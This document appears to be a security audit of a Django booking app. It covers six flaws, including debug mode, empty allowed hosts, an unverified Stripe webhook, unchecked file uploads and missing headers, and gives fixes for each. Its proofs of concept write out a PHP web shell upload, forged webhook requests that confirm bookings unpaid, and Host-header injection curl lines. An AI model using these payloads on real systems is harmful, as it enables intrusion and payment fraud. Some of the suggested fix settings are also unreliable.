# Security Vulnerabilities Analysis - HAM Booking App

## 6 Critical Security Vulnerabilities & How to Find Them

---

## VULNERABILITY #1: DEBUG = True in Production ⚠️ CRITICAL

### Risk Level: **CRITICAL** 
### Type: Information Disclosure
### CVSS Score: 7.5 (High)

### Description:
The `DEBUG` setting is set to `True` by default in `project/settings.py`. When DEBUG is enabled in production, Django displays detailed error pages that expose:
- Sensitive environment variables (API keys, database credentials)
- Full file paths and source code
- Complete SQL queries and database structure
- Session data and cookies
- Local variables and their values

### Location:
```python
# project/settings.py (Line 33)
DEBUG = os.getenv('DEBUG', 'True').lower() in ('1', 'true', 'yes')
```

### How to Find It:
1. **Step 1:** Open `project/settings.py`
2. **Step 2:** Look for the line containing `DEBUG =`
3. **Step 3:** Check the default value - it defaults to `'True'`
4. **Step 4:** Trigger an error on production and observe the detailed error page
5. **Step 5:** Look for exposed variables like `STRIPE_SECRET_KEY`, database paths, etc.

### Proof of Concept:
```python
# Visit any URL that causes an error
# You'll see:
# - All environment variables
# - Full file paths: /f:/Sem2/APPSwc/Airbnb/HAM-Booking/...
# - SQL queries and connections
# - STRIPE_SECRET_KEY and STRIPE_PUBLISHABLE_KEY
```

### Fix:
```python
# project/settings.py
DEBUG = os.getenv('DEBUG', 'False').lower() in ('1', 'true', 'yes')
# Set DEBUG=False in production .env file
```

---

## VULNERABILITY #2: Empty ALLOWED_HOSTS ⚠️ CRITICAL

### Risk Level: **CRITICAL**
### Type: Host Header Injection
### CVSS Score: 7.1 (High)

### Description:
The `ALLOWED_HOSTS` is an empty list, which means Django will accept requests from ANY hostname. This allows:
- **Host Header Injection Attacks**: Attacker can inject malicious hostnames
- **Cache Poisoning**: Attacker can manipulate cached responses
- **Password Reset Token Exploitation**: Tokens in emails can be manipulated
- **Email Spoofing**: Confirmation links can redirect to attacker's domain

### Location:
```python
# project/settings.py (Line 35)
ALLOWED_HOSTS = []
```

### How to Find It:
1. **Step 1:** Open `project/settings.py`
2. **Step 2:** Search for `ALLOWED_HOSTS =`
3. **Step 3:** Verify it's an empty list `[]`
4. **Step 4:** Test by sending request with fake Host header:
   ```bash
   curl -H "Host: evil.com" http://localhost:8000/
   ```
5. **Step 5:** If accepted without 400 error, vulnerability exists

### Proof of Concept:
```bash
# This request will be accepted (should be rejected)
curl -H "Host: attacker.com" http://yoursite.com/accounts/password-reset/

# Attacker can inject their domain in password reset emails:
# Click here to reset: http://attacker.com/fake-reset-page
```

### Fix:
```python
# project/settings.py
ALLOWED_HOSTS = ['yourdomain.com', 'www.yourdomain.com']
# Or for development:
ALLOWED_HOSTS = ['localhost', '127.0.0.1', 'yourdomain.com']
```

---

## VULNERABILITY #3: @csrf_exempt on Stripe Webhook Without Proper Verification ⚠️ CRITICAL

### Risk Level: **CRITICAL**
### Type: Webhook Verification Bypass / Privilege Escalation
### CVSS Score: 9.1 (Critical)

### Description:
The Stripe webhook endpoint uses `@csrf_exempt` but has insufficient verification:
- The `csrf_exempt` decorator disables CSRF protection
- When `STRIPE_WEBHOOK_SECRET` is not configured, webhooks are accepted WITHOUT verification
- Attackers can craft fake webhook requests to:
  - Mark any booking as `'confirmed'` without payment
  - Bypass payment verification
  - Create fraudulent transactions

### Location:
```python
# property/views.py (Line 300-313)
@csrf_exempt
def stripe_webhook(request):
    """Endpoint to receive Stripe webhooks and confirm bookings on successful payment."""
    ...
    if webhook_secret:
        try:
            event = _stripe.Webhook.construct_event(payload, sig_header, webhook_secret)
        except ValueError:
            return HttpResponse(status=400)
        except _stripe.error.SignatureVerificationError:
            return HttpResponse(status=400)
    else:
        # No webhook secret configured: try to parse without verification (development only)
        try:
            event = _stripe.Event.construct_from(_stripe.util.json.loads(payload), _stripe.api_key)
        except Exception:
            return HttpResponse(status=400)
```

### How to Find It:
1. **Step 1:** Open `property/views.py`
2. **Step 2:** Search for `@csrf_exempt` decorator
3. **Step 3:** Find the `stripe_webhook` function
4. **Step 4:** Check if `STRIPE_WEBHOOK_SECRET` is configured:
   - Open `project/settings.py`
   - Search for `STRIPE_WEBHOOK_SECRET` - it's not defined!
5. **Step 5:** Test with malicious webhook:
   ```python
   import requests
   import json
   
   # Craft fake webhook
   fake_event = {
       'type': 'checkout.session.completed',
       'data': {
           'object': {
               'metadata': {
                   'booking_id': '1'  # Any booking ID
               }
           }
       }
   }
   
   requests.post(
       'http://yoursite.com/property/stripe/webhook/',
       data=json.dumps(fake_event),
       headers={'Content-Type': 'application/json'}
   )
   # Booking will be marked as 'confirmed' without payment!
   ```

### Proof of Concept:
```python
# Attacker sends:
POST /property/stripe/webhook/
Content-Type: application/json

{
    "type": "checkout.session.completed",
    "data": {
        "object": {
            "metadata": {
                "booking_id": "1"
            }
        }
    }
}

# Result: Booking ID 1 is marked as confirmed without payment!
```

### Fix:
```python
# 1. Set STRIPE_WEBHOOK_SECRET in .env
# Get from Stripe Dashboard > Webhooks
STRIPE_WEBHOOK_SECRET = "whsec_test_secret_key_here"

# 2. Update settings.py
STRIPE_WEBHOOK_SECRET = os.getenv('STRIPE_WEBHOOK_SECRET')

# 3. Remove @csrf_exempt and use proper verification:
# Instead, use require_http_methods or validate IP
from django.views.decorators.http import require_http_methods
from django.views.decorators.csrf import csrf_exempt

@require_http_methods(["POST"])
@csrf_exempt  # Still needed for Stripe, but with verification
def stripe_webhook(request):
    # Always verify signature - never skip!
    if not STRIPE_WEBHOOK_SECRET:
        return HttpResponse("Webhook secret not configured", status=500)
    # ... rest of code with verification
```

---

## VULNERABILITY #4: Missing File Type Validation in Property Form ⚠️ HIGH

### Risk Level: **HIGH**
### Type: Arbitrary File Upload / Remote Code Execution
### CVSS Score: 8.8 (High)

### Description:
The `PropertyForm` accepts file uploads but:
- No validation of file MIME types
- No validation of file extensions
- No sanitization of filenames
- Attackers can upload:
  - Executable files (`.exe`, `.php`, `.py`)
  - Archive bombs (`.zip`, `.rar`)
  - Malicious documents (`.pdf` with exploits)
  - Server scripts that could be executed

### Location:
```python
# property/forms.py (Line 20-45)
class PropertyForm(forms.ModelForm):
    extra_images = MultipleFileField(
        required=False,
        help_text='Upload up to 9 extra images...',
    )
    
    # No clean_extra_images() method to validate file types!
    
    class Meta:
        model = Property
        fields = ['name', 'image', 'price', 'description', 'places', 'category']
```

### How to Find It:
1. **Step 1:** Open `property/forms.py`
2. **Step 2:** Search for `MultipleFileField` class
3. **Step 3:** Check the `PropertyForm` class
4. **Step 4:** Look for file validation methods - you'll find NONE:
   - No `clean_image()` method
   - No `clean_extra_images()` method
   - No MIME type checking
   - No file extension validation
5. **Step 5:** Test by uploading a `.php` file:
   ```bash
   # Create malicious file
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   
   # Upload as "image"
   # File gets stored in /media/Property/ or /media/propertyimages/
   ```

### Proof of Concept:
```python
# In Django shell:
from property.forms import PropertyForm
from django.core.files.uploadedfile import SimpleUploadedFile

# Craft malicious PHP file
malicious_file = SimpleUploadedFile(
    "shell.php",
    b"<?php system($_GET['cmd']); ?>",
    content_type="application/octet-stream"
)

# Upload through form - NO VALIDATION!
form_data = {
    'extra_images': [malicious_file]
}
# File gets saved to /media/propertyimages/shell.php
# If web server executes it, we have RCE!
```

### Fix:
```python
# property/forms.py
from django.core.exceptions import ValidationError
import os

ALLOWED_IMAGE_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp'}
ALLOWED_IMAGE_MIMES = {
    'image/jpeg', 'image/png', 'image/gif', 'image/webp'
}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB per image

class PropertyForm(forms.ModelForm):
    # ... existing code ...
    
    def clean_image(self):
        image = self.cleaned_data.get('image')
        if image:
            # Validate extension
            ext = os.path.splitext(image.name)[1].lower()
            if ext not in ALLOWED_IMAGE_EXTENSIONS:
                raise ValidationError(f"Invalid file type: {ext}")
            
            # Validate MIME type
            if hasattr(image, 'content_type'):
                if image.content_type not in ALLOWED_IMAGE_MIMES:
                    raise ValidationError(f"Invalid MIME type: {image.content_type}")
            
            # Validate file size
            if image.size > MAX_FILE_SIZE:
                raise ValidationError("File size exceeds 5MB limit")
        
        return image
    
    def clean_extra_images(self):
        images = self.cleaned_data.get('extra_images', [])
        for image in images:
            # Apply same validation as main image
            ext = os.path.splitext(image.name)[1].lower()
            if ext not in ALLOWED_IMAGE_EXTENSIONS:
                raise ValidationError(f"Invalid file type for {image.name}: {ext}")
            
            if hasattr(image, 'content_type'):
                if image.content_type not in ALLOWED_IMAGE_MIMES:
                    raise ValidationError(f"Invalid MIME type for {image.name}")
            
            if image.size > MAX_FILE_SIZE:
                raise ValidationError(f"{image.name} exceeds 5MB limit")
        
        return images
```

---

## VULNERABILITY #5: Missing Security Headers & HTTPS Configuration ⚠️ HIGH

### Risk Level: **HIGH**
### Type: Missing Security Headers / Man-in-the-Middle
### CVSS Score: 7.5 (High)

### Description:
The Django settings are missing critical security headers:
- **No HSTS (HTTP Strict Transport Security)** - Browsers can be tricked into HTTP
- **No SECURE_HSTS_SECONDS** - No protection against downgrade attacks
- **SESSION_COOKIE_SECURE not set** - Session cookies sent over HTTP
- **CSRF_COOKIE_SECURE not set** - CSRF token sent over HTTP
- **No X_FRAME_OPTIONS** - Vulnerable to clickjacking
- **No SECURE_CONTENT_SECURITY_POLICY** - No XSS protection

### Location:
```python
# project/settings.py - END OF FILE
# These settings are MISSING:
# SECURE_HSTS_SECONDS
# SECURE_HSTS_INCLUDE_SUBDOMAINS
# SECURE_HSTS_PRELOAD
# SESSION_COOKIE_SECURE
# CSRF_COOKIE_SECURE
# X_FRAME_OPTIONS
# SECURE_CONTENT_SECURITY_POLICY
```

### How to Find It:
1. **Step 1:** Open `project/settings.py`
2. **Step 2:** Scroll to the end of file
3. **Step 3:** Search for these settings (they won't exist):
   - `SECURE_HSTS_SECONDS`
   - `SESSION_COOKIE_SECURE`
   - `CSRF_COOKIE_SECURE`
   - `X_FRAME_OPTIONS`
4. **Step 4:** Test in browser DevTools:
   - Open Network tab
   - Look at Response Headers
   - You'll see NONE of these security headers
5. **Step 5:** Test with curl:
   ```bash
   curl -I http://yoursite.com/ | grep -i secure
   # Will return nothing - no security headers!
   ```

### Proof of Concept:
```bash
# Man-in-the-Middle Attack
# Since HSTS is not set, attacker can downgrade HTTPS to HTTP

# Victim visits: https://yoursite.com/accounts/login
# On first visit, no HSTS header sent
# Attacker intercepts and redirects to: http://yoursite.com/accounts/login
# Credentials sent in plaintext!
```

### Fix:
```python
# project/settings.py - Add at the end:

# HTTPS & Security Headers
if not DEBUG:  # Only in production
    SECURE_HSTS_SECONDS = 31536000  # 1 year
    SECURE_HSTS_INCLUDE_SUBDOMAINS = True
    SECURE_HSTS_PRELOAD = True
    SESSION_COOKIE_SECURE = True
    CSRF_COOKIE_SECURE = True
    SECURE_SSL_REDIRECT = True
    X_FRAME_OPTIONS = 'DENY'
    SECURE_CONTENT_SECURITY_POLICY = {
        'default-src': ("'self'",),
        'script-src': ("'self'", "'unsafe-inline'", 'cdn.jsdelivr.net'),
        'style-src': ("'self'", "'unsafe-inline'"),
    }
else:
    # Development settings
    SESSION_COOKIE_SECURE = False
    CSRF_COOKIE_SECURE = False
```

---

## VULNERABILITY #6: Horizontal Privilege Escalation in Booking Payment Handling ⚠️ CRITICAL

### Risk Level: **CRITICAL**
### Type: Horizontal Privilege Escalation / Payment Bypass
### CVSS Score: 8.6 (High)

### Description:
The webhook handler and booking confirmation don't properly verify user ownership:
- No validation that the booking belongs to the authenticated user
- Attackers can access bookings via direct URL manipulation
- Stripe webhook processes ANY booking_id in metadata
- `cancel_reservation` only checks booking.user but doesn't verify request headers
- Attackers can cancel/modify other users' bookings if they know the booking ID

### Location:
```python
# property/views.py (Line 58-92)
# In PropertyDetail.post() - booking confirmation
if booking_id and payment_status == 'paid':
    try:
        booking = PropertyBook.objects.get(id=int(booking_id))  # ❌ NO USER VERIFICATION
        if booking.status != 'confirmed':
            booking.status = 'confirmed'
            booking.save()

# Line 310-320 - Webhook handler
if booking_id:
    try:
        booking = PropertyBook.objects.get(id=int(booking_id))  # ❌ NO USER VERIFICATION
        booking.status = 'confirmed'
        booking.save()

# accounts/views.py (Line 66-82)
@login_required
def cancel_reservation(request, pk):
    try:
        booking = PropertyBook.objects.get(id=pk)
    except PropertyBook.DoesNotExist:
        return redirect('accounts:reservation')

    if booking.user != request.user:  # ✓ This check exists
        return redirect('accounts:reservation')
    # BUT: No CSRF token verification on direct GET requests!
```

### How to Find It:
1. **Step 1:** Open `property/views.py`
2. **Step 2:** Find `PropertyDetail.post()` method (Line 58)
3. **Step 3:** Look at booking confirmation logic - search for:
   ```python
   booking = PropertyBook.objects.get(id=int(booking_id))
   ```
4. **Step 4:** Verify there's NO check for `booking.user == request.user`
5. **Step 5:** Find the stripe_webhook function (Line 310)
6. **Step 6:** Same issue - NO user verification!
7. **Step 7:** Test exploitation:
   ```bash
   # Attacker crafts webhook with victim's booking_id
   POST /property/stripe/webhook/
   
   {
       "type": "checkout.session.completed",
       "data": {
           "object": {
               "metadata": {
                   "booking_id": "999"  # Some other user's booking
               }
           }
       }
   }
   
   # Booking 999 is confirmed without payment verification!
   ```

### Proof of Concept:
```python
# Scenario: Attacker wants to book a property but bypass payment

# 1. Attacker creates a booking (status = 'pending')
# Booking ID: 42

# 2. Attacker sends crafted webhook
curl -X POST http://yoursite.com/property/stripe/webhook/ \
  -H "Content-Type: application/json" \
  -d '{
    "type": "checkout.session.completed",
    "data": {
      "object": {
        "metadata": {
          "booking_id": "42"
        }
      }
    }
  }'

# 3. Booking becomes 'confirmed' WITHOUT PAYMENT
# Attacker got free reservation!

# Result: Loss of $$$, fraudulent bookings
```

### Fix:
```python
# property/views.py

# Fix 1: In PropertyDetail.post() - verify user ownership
if booking_id and payment_status == 'paid':
    try:
        booking = PropertyBook.objects.get(id=int(booking_id))
        
        # ✓ ADD THIS CHECK
        if booking.user != self.request.user:
            # Suspicious activity - log and reject
            return HttpResponse("Unauthorized booking", status=403)
        
        if booking.status != 'confirmed':
            booking.status = 'confirmed'
            booking.save()
            user_booking = booking
            payment_confirmed = True
    except PropertyBook.DoesNotExist:
        pass

# Fix 2: Strengthen webhook signature verification
# (Already covered in Vulnerability #3)

# Fix 3: In stripe_webhook - add additional validation
def stripe_webhook(request):
    # ... existing code ...
    
    if event['type'] == 'checkout.session.completed':
        session = event['data']['object']
        metadata = session.get('metadata', {}) or {}
        booking_id = metadata.get('booking_id')
        
        if booking_id:
            try:
                booking = PropertyBook.objects.get(id=int(booking_id))
                
                # ✓ ADD THIS: Verify amount matches
                expected_amount = booking.total_cost * 100  # in cents
                if int(session.get('amount_total', 0)) != expected_amount:
                    # Amount mismatch - suspicious!
                    return HttpResponse("Amount mismatch", status=400)
                
                # ✓ ADD THIS: Verify customer email
                if session.get('customer_email') and booking.user.email:
                    if session['customer_email'] != booking.user.email:
                        return HttpResponse("Email mismatch", status=400)
                
                booking.status = 'confirmed'
                booking.save()
            except PropertyBook.DoesNotExist:
                pass
    
    return HttpResponse(status=200)
```

---

## Summary Table

| # | Vulnerability | Type | CVSS | Impact |
|---|---|---|---|---|
| 1 | DEBUG = True | Information Disclosure | 7.5 | Exposes all secrets |
| 2 | Empty ALLOWED_HOSTS | Host Header Injection | 7.1 | Cache poisoning, spoofing |
| 3 | CSRF Exempt Webhook | Privilege Escalation | **9.1** | Fake bookings, fraud |
| 4 | No File Validation | Arbitrary Upload | 8.8 | RCE, malware |
| 5 | Missing Security Headers | MITM | 7.5 | Session hijacking |
| 6 | Booking Verification | Privilege Escalation | 8.6 | Fraudulent bookings |

---

## How to Test All Vulnerabilities

### Testing Checklist:
```bash
# 1. Check DEBUG setting
grep -n "DEBUG = " project/settings.py

# 2. Check ALLOWED_HOSTS
grep -n "ALLOWED_HOSTS" project/settings.py

# 3. Check CSRF on webhook
grep -n "@csrf_exempt" property/views.py
grep -n "STRIPE_WEBHOOK_SECRET" project/settings.py

# 4. Check file validation
grep -n "clean_" property/forms.py  # Should find clean_image, clean_extra_images

# 5. Check security headers
grep -n "SECURE_HSTS_SECONDS\|SESSION_COOKIE_SECURE\|X_FRAME_OPTIONS" project/settings.py

# 6. Check booking verification
grep -n "booking.user ==" property/views.py
grep -n "PropertyBook.objects.get" property/views.py
```

---

## Quick Fixes Priority Order
1. **FIRST**: Fix CSRF exempt webhook (Vulnerability #3) - Payment fraud risk
2. **SECOND**: Add file validation (Vulnerability #4) - RCE risk
3. **THIRD**: Fix DEBUG and ALLOWED_HOSTS (Vulnerabilities #1, #2)
4. **FOURTH**: Add security headers (Vulnerability #5)
5. **FIFTH**: Add booking verification (Vulnerability #6)
